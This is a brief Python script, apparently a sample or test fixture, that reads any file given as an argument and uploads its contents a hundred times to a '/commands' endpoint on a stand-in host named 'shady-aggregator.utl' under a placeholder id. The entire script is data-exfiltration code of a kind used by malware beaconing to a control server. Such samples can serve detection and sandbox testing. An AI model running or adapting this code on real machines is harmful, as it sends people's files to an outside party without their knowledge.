import time
import sys
import requests

def main():

    url = "http://shady-aggregator.utl/f52e6101/"
    id = "DEADBEEFDEADBEEF" 
    file_contents = open(sys.argv[1], "rb").read()
    file_form = {"file": file_contents}

    for _ in range(100):
        requests.post(url + id + "/commands", files=file_form)
        time.sleep(1)
  
if __name__ == "__main__":
    main()
